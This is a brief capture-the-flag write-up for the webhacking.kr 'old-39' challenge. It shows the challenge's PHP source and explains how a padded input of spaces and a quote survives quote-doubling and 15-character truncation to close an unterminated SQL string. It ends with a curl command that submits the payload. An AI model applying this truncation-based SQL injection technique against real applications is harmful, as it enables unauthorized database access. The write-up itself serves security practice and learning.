# Old 39    SQLi (Length)

URL: [https://webhacking.kr/challenge/bonus-10/?view_source=1](https://webhacking.kr/challenge/bonus-10/?view_source=1)

![old-39-1.png](/assets/ctf/webhacking.kr/old-39-1.png)

```php
<?php
  $db = dbconnect();
  if($_POST['id']){
    $_POST['id'] = str_replace("\\","",$_POST['id']);
    $_POST['id'] = str_replace("'","''",$_POST['id']);
    $_POST['id'] = substr($_POST['id'],0,15);
    $result = mysqli_fetch_array(mysqli_query($db,"select 1 from member where length(id)<14 and id='{$_POST['id']}"));
    if($result[0] == 1){
      solve(39);
    }
  }
?>
```

To win we have to get valid SQL query. 
1. `id` starts with quote (`'`), but never ends. 
2. Quote in string gets replaced by 2 quotes.
3. Slash character is not allowed
4. String length is limited to 15
5. String is cut of after replace

Payload: `1             '` (id + padding + closing_quote)

```bash
curl 'https://webhacking.kr/challenge/bonus-10/index.php' \
  -H 'Cookie: PHPSESSID=3052403292' \
  -d 'id=1+++++++++++++%27'
```

